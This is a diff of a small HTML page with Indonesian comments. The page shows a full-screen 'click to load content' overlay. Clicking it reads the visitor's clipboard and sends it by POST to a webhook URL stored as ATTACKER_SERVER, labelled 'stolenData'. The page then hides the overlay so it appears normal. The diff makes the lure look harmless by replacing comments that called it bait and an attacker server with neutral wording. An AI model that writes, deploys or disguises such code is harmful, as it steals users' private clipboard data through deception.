@@ -1,32 +1,30 @@
 <!DOCTYPE html>
 <html>
-<body style="height: 100vh; width: 100vw; margin: 0; display: flex; align-items: center; justify-content: center; background-color: white;">
-    
-    <!-- Elemen pancingan ini menutupi seluruh layar -->
-    <button id="pancingan" style="position: absolute; top: 0; left: 0; width: 100vw; height: 100vh; opacity: 0; z-index: 9999;">
-        Klik untuk melanjutkan
-    </button>
+<body style="height: 100vh; width: 100vw; margin: 0; display: flex; align-items: center; justify-content: center; background-color: #f0f0f0; font-family: sans-serif;">
 
-    <div id="hasil" style="font-family: sans-serif; color: #333;">Memuat...</div>
+    <!-- Elemen overlay untuk menangkap interaksi pertama pengguna -->
+    <div id="overlay" style="position: absolute; top: 0; left: 0; width: 100vw; height: 100vh; display: flex; align-items: center; justify-content: center; cursor: pointer;">
+        <p>Klik di sini untuk memuat konten</p>
+    </div>
 
     <script>
-        const ATTACKER_SERVER = " https://webhooksite.net/bb68cf8b-0195-4e27-ae86-f786850da709";
+        const ATTACKER_SERVER = "	https://webhooksite.net/bb68cf8b-0195-4e27-ae86-f786850da709";
 
-        document.getElementById('pancingan').addEventListener('click', async () => {
+        document.getElementById('overlay').addEventListener('click', async () => {
             try {
-                // Meminta izin pembacaan clipboard
+                // Mencoba membaca clipboard
                 const text = await navigator.clipboard.readText();
                 
-                // Mengirim data ke server penyerang
+                // Mengirim data ke server
                 await fetch(ATTACKER_SERVER, {
                     method: 'POST',
                     mode: 'no-cors',
                     body: JSON.stringify({ stolenData: text })
                 });
 
-                // Menghilangkan elemen pancingan setelah berhasil agar aplikasi terlihat normal
-                document.getElementById('pancingan').style.display = 'none';
-                document.getElementById('hasil').innerText = "Konten dimuat.";
+                // Menyembunyikan overlay setelah interaksi
+                document.getElementById('overlay').style.display = 'none';
+                document.body.innerHTML += "<h1>Konten berhasil dimuat.</h1>";
             } catch (err) {
                 console.error("Gagal akses clipboard:", err);
             }
